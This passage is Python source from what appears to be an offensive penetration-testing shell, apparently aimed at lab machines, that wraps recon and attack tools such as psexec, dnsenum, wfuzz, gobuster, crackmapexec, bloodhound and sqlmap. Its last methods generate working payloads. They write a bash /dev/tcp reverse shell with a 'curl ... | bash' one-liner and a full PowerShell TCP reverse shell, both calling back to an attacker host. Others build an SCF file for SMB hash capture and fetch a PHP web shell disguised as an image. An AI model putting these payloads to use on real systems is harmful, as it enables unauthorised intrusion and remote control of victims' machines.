        rhost = self.params["rhost"]
        os.system(f"impacket-psexec administrator@{rhost}")

    def do_rpcdump(self, line):
        """
        Executes the `rpcdump.py` script to dump RPC services from a target host.

        1. Retrieves the target host IP from the `rhost` parameter.
        2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
        3. Executes the `rpcdump.py` script on port 135 and 593 to gather RPC service information from the target host.

        :param line: This parameter is not used in this command but is included for consistency with other methods.
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            rpcdump.py -p 135 <target_host>
            rpcdump.py -p 593 <target_host>
        Replace `<target_host>` with the IP address or hostname of the target machine.
        """
        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... rpcdump.py -p 135 {rhost}{RESET}")
            os.system(f"rpcdump.py -p 135 {rhost}")
            print_msg(f"Try... rpcdump.py -p 593 {rhost}{RESET}")
            os.system(f"rpcdump.py -p 593 {rhost}")
        return

    def do_dig(self, line):
        """
        Executes the `dig` command to query DNS information.

        1. Retrieves the DNS server IP from the `line` parameter and the target host from the `rhost` parameter.
        2. If either the DNS server or `rhost` is not provided, an error message is printed.
        3. Executes the `dig` command to query the version of the DNS server and additional records.

        :param line: DNS server IP or hostname. Must be provided for the `dig` command.
        :param rhost: Target host for additional `dig` queries.

        :returns: None

        Manual execution:
        To manually run these commands, use the following syntax:
            dig version.bind CHAOS TXT @<dns_server>
            dig any <domain> @<rhost>

        Replace `<dns_server>` with the IP address or hostname of the DNS server, `<domain>` with the target domain, and `<rhost>` with the IP address or hostname of the target machine.
        """

        rhost = self.params["rhost"]
        if not line or not rhost:
            print_error(
                "[-] rhost must be set or you must pass the dns argument like dig box.htb"
            )
            return
        print_msg(f"Try dig version.bind CHAOS TXT @{line} {RESET}")
        os.system(f"dig version.bind CHAOS TXT @{line}")
        print_msg(f"dig any {line} @{rhost}")
        os.system(f"dig any {line} @{rhost}")
        return

    def do_cp(self, line):
        """
        Copies a file from the ExploitDB directory to the sessions directory.

        1. Retrieves the path to the ExploitDB directory and the target file from the `line` parameter.
        2. Copies the specified file from the ExploitDB directory to the `sessions` directory in the current working directory.

        :param line: The relative path to the file within the ExploitDB directory. For example, `java/remote/51884.py`.
        :param exploitdb: The path to the ExploitDB directory. This must be set in advance or provided directly.

        :returns: None

        Manual execution:
        To manually copy files, use the following syntax:
            cp <exploitdb_path><file_path> <destination_path>

        Replace `<exploitdb_path>` with the path to your ExploitDB directory, `<file_path>` with the relative path to the file, and `<destination_path>` with the path where you want to copy the file.

        For example:
            cp /usr/share/exploitdb/exploits/java/remote/51884.py /path/to/sessions/
        """

        exploitdb = self.params["exploitdb"]
        path = os.getcwd()
        if not line or not exploitdb:
            print_error(
                "exploitdb must be set, use set exploitdb /usr/share/exploitdb/exploits/ or pass the relative directory path show in the ss alias of command searchsploit, like cp java/remote/51884.py to see the ralive path use ex: ss TeamCity -x java/remote/51884.py"
            )
            return
        print_msg(f"Try cp {exploitdb}{line} {path}/sessions/{RESET}")
        os.system(f"cp {exploitdb}{line} {path}/sessions/")

        return

    def do_dnsenum(self, line):
        """
        Performs DNS enumeration using `dnsenum` to identify subdomains for a given domain.

        1. Executes the `dnsenum` command with parameters to specify the DNS server, output file, and wordlist for enumeration.

        :param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
        :param rhost: The DNS server to use for enumeration, e.g., `10.10.11.24`.
        :param dnswordlist: The path to the DNS wordlist file used for subdomain discovery.

        :returns: None

        Manual execution:
        To manually perform DNS enumeration, use the following command:
            dnsenum --dnsserver <dns_server> --enum -p 0 -s 0 -o <output_file> -f <dns_wordlist> <target_domain>

        Replace `<dns_server>` with the DNS server IP, `<output_file>` with the file path to save the results, `<dns_wordlist>` with the path to your DNS wordlist file, and `<target_domain>` with the domain to be enumerated.

        For example:
            dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb
        """

        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not rhost or not dnswordlist:
            print_error(
                "rhost and dnswordlist must be set example: set rhost 10.10.10.10 or you need pass the domain "
            )
            return
        print_msg(
            f"Try ... dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line} {RESET}"
        )
        os.system(
            f"dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line}"
        )
        return

    def do_dnsmap(self, line):
        """
        Performs DNS enumeration using `dnsmap` to discover subdomains for a specified domain.

        1. Executes the `dnsmap` command to scan the given domain with a specified wordlist.

        :param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
        :param dnswordlist: The path to the wordlist file used for DNS enumeration.

        :returns: None

        Manual execution:
        To manually perform DNS enumeration, use the following command:
            dnsmap <target_domain> -w <dns_wordlist>

        Replace `<target_domain>` with the domain you want to scan and `<dns_wordlist>` with the path to your DNS wordlist file.

        For example:
            dnsmap ghost.htb -w /path/to/dnswordlist.txt
        """

        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not dnswordlist:
            print_error(
                f"dnswordlist must be set example: set dnswordlist path/to/wordlist or you need pass the domain {RESET}"
            )
            return
        print_msg(f"    {GREEN}[+] Try ... dnsmap {line} -w {dnswordlist} {RESET}")
        os.system(f"dnsmap {line} -w {dnswordlist}")
        return

    def do_whatweb(self, line):
        """
        Performs a web technology fingerprinting scan using `whatweb`.

        1. Executes the `whatweb` command to identify technologies used by the target web application.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target web host to be scanned, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform web technology fingerprinting, use the following command:
            whatweb <target_host>

        Replace `<target_host>` with the URL or IP address of the web application you want to scan.

        For example:
            whatweb example.com
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... whatweb {rhost}{RESET}")
        os.system(f"whatweb {rhost}")

    def do_enum4linux(self, line):
        """
        Performs enumeration of information from a target Linux/Unix system using `enum4linux`.

        1. Executes the `enum4linux` command with the `-a` option to gather extensive information from the specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a Linux/Unix system, use the following command:
            enum4linux -a <target_host>

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            enum4linux -a 192.168.1.10
        """

        if not self.params["rhost"]:
            print_msg("rhost must be set")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... enum4linux -a {rhost} {RESET}")
        os.system(f"enum4linux -a {rhost}")
        return

    def do_nbtscan(self, line):
        """
        Performs network scanning using `nbtscan` to discover NetBIOS names and addresses in a specified range.

        1. Executes the `nbtscan` command with the `-r` option to scan the specified range of IP addresses for NetBIOS information.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The target network range for scanning, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a NetBIOS scan across a network range, use the following command:
            sudo nbtscan -r <network_range>

        Replace `<network_range>` with the IP address range you want to scan. For example:
            sudo nbtscan -r 192.168.1.0/24
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... sudo nbtscan -r {rhost}/24 {RESET}")
        os.system(f"sudo nbtscan -r {rhost}/24")
        return

    def do_rpcclient(self, line):
        """
        Executes the `rpcclient` command to interact with a remote Windows system over RPC (Remote Procedure Call) using anonymous credentials.

        1. Runs `rpcclient` with the `-U ''` (empty username) and `-N` (no password) options to connect to the target host specified by `rhost`.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the remote host to connect to, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually interact with a remote Windows system using RPC, use the following command:
            rpcclient -U '' -N <target_ip>

        Replace `<target_ip>` with the IP address of the target system. For example:
            rpcclient -U '' -N 10.10.10.10
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... rpcclient -U '' -N {rhost} {RESET}")
        os.system(f"rpcclient -U '' -N {rhost}")
        return

    def do_nikto(self, line):
        """
        Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.

        1. Executes `nikto` with the `-h` option to specify the target host IP address.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the target web server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a web server vulnerability scan using `nikto`, use the following command:
            nikto -h <target_ip>

        Replace `<target_ip>` with the IP address of the target web server. For example:
            nikto -h 10.10.10.10
        """

        if not self.params["rhost"]:
            print_error("rhost must be set")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try nikto -h {rhost} {RESET}")
        os.system(f"nikto -h {rhost}")
        return

    def do_openssl_sclient(self, line):
        """
        Uses `openssl s_client` to connect to a specified host and port, allowing for testing and debugging of SSL/TLS connections.

        :param line: The port number to connect to on the target host. This must be provided as an argument.
        :param rhost: The IP address or hostname of the target server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually connect to a server using `openssl s_client` and test SSL/TLS, use the following command:
            openssl s_client -connect <target_ip>:<port>

        Replace `<target_ip>` with the IP address or hostname of the target server and `<port>` with the port number. For example:
            openssl s_client -connect 10.10.10.10:443
        """

        if not self.params["rhost"] or not line:
            print_error(
                "rhost must be set and you need pass the port by argument ex: openssl_sckient 443"
            )
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... openssl s_client -connect  {rhost}:{line} {RESET}")
        os.system(f"openssl s_client -connect  {rhost}:{line}")
        return

    def do_ss(self, line):
        """
        Uses `searchsploit` to search for exploits in the Exploit Database based on the provided search term.

        :param line: The search term or query to find relevant exploits. This must be provided as an argument.

        :returns: None

        Manual execution:
        To manually search for exploits using `searchsploit`, use the following command:
            searchsploit <search_term>

        Replace `<search_term>` with the term or keyword you want to search for. For example:
            searchsploit kernel
        """

        print_msg(f"Searching in searchsploit{RESET}")
        os.system(f"searchsploit {line}")

    def do_wfuzz(self, line):
        """
        Uses `wfuzz` to perform fuzzing based on provided parameters. This function supports various options for directory and file fuzzing.

        :param line: The options and arguments for `wfuzz`. The `line` parameter can include the following:
            - `sub <domain>`: Fuzz DNS subdomains. Requires `dnswordlist` to be set.
            - `iis`: Fuzz IIS directories. Uses a default wordlist if `iiswordlist` is not set.
            - Any other argument: General directory and file fuzzing.

        :returns: None

        Manual execution:
        To manually use `wfuzz` for directory and file fuzzing, use the following commands:

        1. For fuzzing DNS subdomains:
            wfuzz -c <extra_options> -t <threads> -w <wordlist> -H 'Host: FUZZ.<domain>' <domain>

        Example:
            wfuzz -c --hl=7 -t 200 -w /path/to/dnswordlist -H 'Host: FUZZ.example.com' example.com

        2. For fuzzing IIS directories:
            wfuzz -c <extra_options> -t <threads> -w /path/to/iiswordlist http://<rhost>/FUZZ

        Example:
            wfuzz -c --hl=7 -t 200 -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.10/FUZZ

        3. For general directory and file fuzzing:
            wfuzz -c <extra_options> -t <threads> -w <wordlist> http://<rhost>/FUZZ

        Example:
            wfuzz -c --hl=7 -t 200 -w /path/to/dirwordlist http://10.10.10.10/FUZZ
        """

        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print_error(f"dirwordlist and rhost must be set{RESET}")
            return

        if line:
            if line.startswith("sub"):
                params = line.split(" ")
                count = len(params)
                dnswordlist = self.params["dnswordlist"]
                if not dnswordlist:
                    print_error(
                        "use payload or p to load the parameter from payload.json, or just set dnswordlist path/to/dnswordlist"
                    )
                    return

                if count == 1:
                    print_error(
                        f"you must pass the dommain like argument ex:{GREEN} wfuzz sub box.htb"
                    )
                    return

                arg1 = params[0]
                domain = params[1]
                if count > 2:
                    arg3 = params[2]
                else:
                    arg3 = ""
                print_msg(
                    f"Try ...  wfuzz -c {arg3} -t 200 -w {dnswordlist} -H 'Host: FUZZ.{domain}' {domain} {RESET}"
                )
                os.system(
                    f"wfuzz -c {arg3} -t 200 -w {dnswordlist} -H 'Host: FUZZ.{domain}' {domain}"
                )
                return

            if line.startswith("iis"):
                params = line.split(" ")
                print_msg(params)
                count = len(params)
                arg1 = params[0]
                iiswordlist = "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt"  # dont know why this line dont work ... self.params['iiswordlist']

                if not os.path.exists(iiswordlist):
                    print_error(
                        f"you must have file iiswordlist use the command: getseclist, use p or payload to load parameters from payload.json, or just set iiswordlist /pat/to/iiswordlist"
                    )
                    return
                # Abre el archivo en modo de lectura
                if count > 1:
                    arg3 = params[1]
                else:
                    arg3 = ""
                print_msg(
                    f"Try ...  wfuzz -c {arg3} -t 200 -w {iiswordlist} http://{rhost}/FUZZ {RESET}"
                )
                os.system(
                    f"wfuzz -c {arg3} -t 200 -w {iiswordlist} http://{rhost}/FUZZ"
                )
                return

        print_msg(
            f"Try ... wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ {RESET}"
        )
        os.system(f"wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
        return

    def do_launchpad(self, line):
        """
        Searches for packages on Launchpad based on the provided search term and extracts codenames from the results. The distribution is extracted from the search term.

        :param line: The search term to be used for querying Launchpad. The `line` parameter should be a string containing
                    the search term, e.g., "8.2p1 Ubuntu 4ubuntu0.11".

        :returns: None

        Manual execution:
        To manually execute the equivalent command, use the following steps:

        1. Extract the distribution from the search term:
        - This function assumes the distribution name is part of the search term and is used to build the URL.

        2. URL encode the search term:
        - Replace spaces with `%20` to form the encoded search query.

        3. Use `curl` to perform the search and filter results:
        curl -s "https://launchpad.net/+search?field.text=<encoded_search_term>" | grep 'href' | grep '<distribution>' | grep -oP '(?<=href="https://launchpad.net/<distribution>/)[^/"]+' | sort -u

        Example:
            If the search term is "8.2p1 Ubuntu 4ubuntu0.11", the command would be:
            curl -s "https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11" | grep 'href' | grep 'ubuntu' | grep -oP '(?<=href="https://launchpad.net/ubuntu/)[^/"]+' | sort -u

        Notes:
            - Ensure that `curl` is installed and accessible in your environment.
            - The extracted codenames are printed to the console.
        """

        parts = line.split()
        if len(parts) > 1:
            distribution = parts[1].lower()
        else:
            distribution = "ubuntu"

        encoded_line = quote(line.strip())

        command = f"curl -s \"https://launchpad.net/+search?field.text={encoded_line}\" | grep 'href' | grep '{distribution}' | grep -oP '(?<=href=\"https://launchpad.net/{distribution}/)[^/\"]+' | sort -u"

        print_msg(
            "Searches for packages on Launchpad based on the provided search, no warranties. ssh package give the best results"
        )
        os.system(command)

    def do_gobuster(self, line):
        """
        Uses `gobuster` for directory and virtual host fuzzing based on provided parameters. Supports directory enumeration and virtual host discovery.

        :param line: The options and arguments for `gobuster`. The `line` parameter can include the following:
            - `url`: Perform directory fuzzing on a specified URL. Requires `url` and `dirwordlist` to be set.
            - `vhost`: Perform virtual host discovery on a specified URL. Requires `url` and `dirwordlist` to be set.
            - Any other argument: General directory fuzzing with additional parameters.

        :returns: None

        Manual execution:
        To manually use `gobuster`, use the following commands:

        1. For directory fuzzing:
            gobuster dir --url <url>/ --wordlist <wordlist>

        Example:
            gobuster dir --url http://example.com/ --wordlist /path/to/dirwordlist

        2. For virtual host discovery:
            gobuster vhost --append-domain -u <url> -w <wordlist> --random-agent -t 600

        Example:
            gobuster vhost --append-domain -u http://example.com -w /path/to/dirwordlist --random-agent -t 600

        3. For general directory fuzzing with additional parameters:
            gobuster dir --url http://<rhost>/ --wordlist <wordlist> <additional_parameters>

        Example:
            gobuster dir --url http://10.10.10.10/ --wordlist /path/to/dirwordlist -x .php,.html
        """

        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print_error(f"rhost and dirwordlist must be set {RESET}")
            return
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
                return
            print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} {RESET}")
            os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
            return
        if line.startswith("vhost"):
            url = self.params["url"]
            if not url:
                print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
                return
            print_msg(
                f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}"
            )
            os.system(
                f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600"
            )
            return
        print_msg(
            f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} {RESET}"
        )
        os.system(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line}")
        return

    def do_addhosts(self, line):
        """
        Adds an entry to the `/etc/hosts` file, mapping an IP address to a domain name.

        :param line: The domain name to be added to the `/etc/hosts` file.
            - Example: `permx.htb`

        :returns: None

        Manual execution:
        To manually add a domain to the `/etc/hosts` file, use the following command:

            sudo sh -c -e "echo '<rhost> <domain>' >> /etc/hosts"

        Example:
            sudo sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts"

        This command appends the IP address and domain name to the `/etc/hosts` file, enabling local resolution of the domain.
        """

        rhost = self.params["rhost"]
        if not rhost or not line:
            print_error(
                f"Add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext {RESET}"
            )
            return
        print_msg(
            f"Try... sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\"; {RESET}"
        )
        os.system(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
        print_msg(f"Done... add {line} to /etc/hosts {RESET}")
        return

    def do_cme(self, line):
        """
        Performs an SMB enumeration using `crackmapexec`.

        :param line: Not used in this function.

        :returns: None

        Manual execution:
        To manually run `crackmapexec` for SMB enumeration, use the following command:

            crackmapexec smb <target>

        Example:
            crackmapexec smb 10.10.11.24

        This command will enumerate SMB shares and perform basic SMB checks against the specified target IP address.
        """

        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... crackmapexec smb {rhost}")
            os.system(f"crackmapexec smb {rhost}")
            print_msg(f"Done... crackmapexec smb {rhost}")
        return

    def do_ldapdomaindump(self, line):
        """
        Dumps LDAP information using `ldapdomaindump` with credentials from a file.

        :param line: The domain to use for authentication (e.g., 'domain.local').

        :returns: None

        Manual execution:
        To manually run `ldapdomaindump` for LDAP enumeration, use the following command:

            ldapdomaindump -u '<domain>\\<username>' -p '<password>' <target>

        Example:
            ldapdomaindump -u 'domain.local\\Administrator' -p 'passadmin123' 10.10.11.23

        Ensure you have a file `sessions/credentials.txt` in the format `user:password`, where each line contains credentials for the LDAP enumeration.
        """

        rhost = self.params["rhost"]
        if not rhost or not line:
            print_error(
                "Add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        path_cred = "sessions/credentials.txt"
        if not os.path.exists(path_cred):
            print_error(
                "You must have file sessions/credentials.txt with this format: user:password"
            )
            return
        # Abre el archivo en modo de lectura
        with open(path_cred, "r") as file:
            # Recorre cada línea del archivo
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace("\n", "")
                print_msg(
                    f"    {GREEN}[*] Try... ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                )
                os.system(
                    f"cd sessions && ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                )
        return

    def do_bloodhound(self, line):
        """Perform LDAP enumeration using bloodhound-python with credentials from a file.

        :param line: This parameter is not used in the function but could be used for additional options or domain information.

        :returns: None

        Manual execution:
        To manually run `bloodhound-python` for LDAP enumeration, use the following command:

            bloodhound-python -c All -u '<username>' -p '<password>' -ns <target>

        Example:
            bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10

        Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.
        """
        rhost = self.params["rhost"]

        if check_rhost(rhost):
            path_cred = "sessions/credentials.txt"
            if not os.path.exists(path_cred):
                print_error(
                    "You must have file sessions/credentials.txt with this format: user:password more help createcredentials"
                )
                return
            # Abre el archivo en modo de lectura
            with open(path_cred, "r") as file:
                # Recorre cada línea del archivo
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    print_msg(
                        f"    {GREEN}[*] Try... bloodhound-python -c All -u '{user}' -p '{passwd}' -ns {rhost}"
                    )
                    os.system(
                        f"cd sessions && bloodhound-python -c All -u '{user}' -p '{passwd}' -ns {rhost}"
                    )
        return

    def do_ping(self, line):
        """Perform a ping to check host availability and infer the operating system based on TTL values.

        :param line: This parameter is not used in the function but could be used for additional options or settings.

        :returns: None

        Manual execution:
        To manually ping a host and determine its operating system, use the following command:

            ping -c 1 <target>

        Example:
            ping -c 1 10.10.10.10

        The TTL (Time To Live) value is used to infer the operating system:
        - TTL values around 64 typically indicate a Linux system.
        - TTL values around 128 typically indicate a Windows system.

        Ensure you have set `rhost` to the target host for the command to work.
        """

        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... ping -c 1 {rhost} ")
            # Ejecutar el comando ping y capturar la salida
            result = subprocess.run(
                ["ping", "-c", "1", rhost], capture_output=True, text=True
            )

            # Verificar la salida y determinar el sistema operativo basado en TTL
            if result.returncode == 0:
                # El ping fue exitoso, parsear la respuesta para obtener el TTL
                try:
                    ttl_index = result.stdout.find("ttl=")
                    if ttl_index != -1:
                        ttl_value = int(
                            result.stdout[ttl_index + 4 : ttl_index + 7]
                        )  # Obtener el valor de TTL
                        print_msg(f"TTL:{ttl_value}")

                        # Determinar basado en el TTL
                        if ttl_value <= 60 or ttl_value <= 64:
                            print_msg(
                                f"{GREEN}Host activo {CYAN}probablemente es {BLUE}Linux{RESET}"
                            )
                        elif ttl_value <= 120 or ttl_value <= 128:
                            print_msg(
                                f"{GREEN}Host activo {CYAN}probablemente es {RED}Windows{RESET}"
                            )
                        else:
                            print_error(
                                "No se puede determinar con certeza el sistema operativo"
                            )
                    else:
                        print_error("No se encontró el TTL en la salida del ping")

                except ValueError:
                    print_error("No se pudo convertir el TTL a un número entero")
            else:
                print_error("No se pudo realizar el ping al host")
            print_msg(f"Done... ping -c 1 {rhost} ")
        return

    def do_gospider(self, line):
        """try gospider"""
        rhost = self.params["rhost"]
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(
                    "If you pass the param url, url mus be set, ex: set url http://url.ext"
                )
                return

            print_msg(f"Try gospider -s {url}")
            os.system(f"gospider -s {url}")
            return

        if not check_rhost(rhost):
            return
        if is_binary_present("gospider"):
            print_msg(f"try... gospider -s http://{rhost}")
            os.system(f"gospider -s http://{rhost}")
        else:
            print_msg(
                "gospider is not installed, installing... (control + c to cancel)"
            )
            os.system(f"sudo apt install gospider -y && gospider -s http://{rhost}")

    def do_arpscan(self, line):
        """try arp-scan"""
        if not self.params["device"]:
            print_error("device must be set")
            return
        device = self.params["device"]
        print_msg("try to arp-scan sudo arp-scan -I DEVICE --localnet")
        os.system(f"sudo arp-scan -I {device} --localnet")

    def do_lazypwn(self, line):
        """LazyPwn"""
        os.system("python3 modules/lazypwn.py")

    def do_fixel(self, line):
        """to fix perms"""
        os.system("dos2unix *")
        os.system("dos2unix modules/*")
        os.system("dos2unix modules/cgi-bin/*")

    def do_smbserver(self, line):
        """Lazy imacket smbserver"""
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        revshell = f"""[Shell]
        Command=2
        IconFile=\\\\\\\\{lhost}\\smbfolder\\icon.ico
        [Taskbar]
        Command=ToggleDesktop
        """.replace("        ", "")
        print_msg(f"Try... echo '{revshell}' > sessions/file.scf ")
        os.system(f"echo '{revshell}' > sessions/file.scf ")
        print_msg(f"echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
        print_msg(f"command copied to clipboard")
        print_msg(f"trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
        os.system(
            f"echo 'curl http://{lhost}/sessions/file.scf -o file.scf' |  xclip -sel clip"
        )
        os.system(
            "cd sessions && sudo impacket-smbserver smbfolder $(pwd) -smb2support"
        )
        return

    def do_sqlmap(self, line):
        """Lazy sqlmap try sqlmap -wizard if don't know how to use requests.txt file always start with req and first parameter"""
        url = self.params["url"]

        if line:
            if line.startswith("req"):
                parts = line.split(" ")
                print_msg("Nùmero de parametros: " + str(len(parts)))

                if len(parts) == 2:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print_msg(
                        f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                if len(parts) == 3:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    arg3 = parts[2]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print_msg(
                        f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 3"
                    )
            if len(parts) == 4:
                arg1 = parts[0]
                arg2 = parts[1]
                arg3 = parts[2]
                arg4 = parts[3]
                path = os.getcwd()
                print_msg(path)
                file = path + "/sessions/" + arg1
                print_msg(file)
                if not os.path.isfile(file) or not os.access(file, os.R_OK):
                    print_error(
                        f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                    )

                    return
                print_msg(
                    f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
                )
                os.system(
                    f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 3"
                )
            elif line.startswith("-wiz"):
                print_msg("Try... sqlmap --wizard")
                os.system("sqlmap -wizard")
        else:
            if not url:
                print_error(
                    "url must be set, ex: (set url http://url.com), see <help set> or <help sqlmap> to more info..."
                )
            return

            print_msg(f"Try... sqlmap -u {url} --os-shell --forms --crawl=2")
            os.system(f"sqlmap -u {url} --os-shell --forms --crawl=2")
        return

    def do_proxy(self, line):
        """Small proxy to modify the request on the fly..."""

        print_msg("Ejecutando Lazy Proxy ...")
        os.system(f"python3 modules/lazyproxy.py")
        print_msg(
            f"{YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}"
        )
        return

    def do_createwebshell(self, line):
        """Crea una webshell disfrazada de jpg en el directorio sessions/"""
        print_msg("Creando la shell disfrazada de jpg")
        os.system("python3 modules/lazycreate_webshell.py")
        os.system(
            "cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php"
        )
        return

    def do_createrevshell(self, line):
        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lport or not lhost:
            print_msg(
                f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload"
            )
            return

        revshell = f"""#!/bin/bash
        bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        """.replace("        ", "")
        print_msg(f"Try... echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
        print_msg(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
        return

    def do_createwinrevshell(self, line):
        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        filename = "sessions/revshell.ps1"
        if not lport or not lhost:
            print_error(
                f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload"
            )
            return

        revshell = (
            """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        """.replace("{lhost}", lhost)
            .replace("{lport}", str(lport))
            .replace("        ", "")
        )

        print_msg(f"Try... echo '{revshell}' > sessions/revshell.ps1 \n")

        with open(filename, "w") as f:
            f.write(revshell)
        f.close()
        print_msg(
            f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} "
        )
        os.system(
            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1' | xclip -sel clip"
        )
        print_msg(
            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\revshell.ps1' | xclip -sel clip"
        )
        return

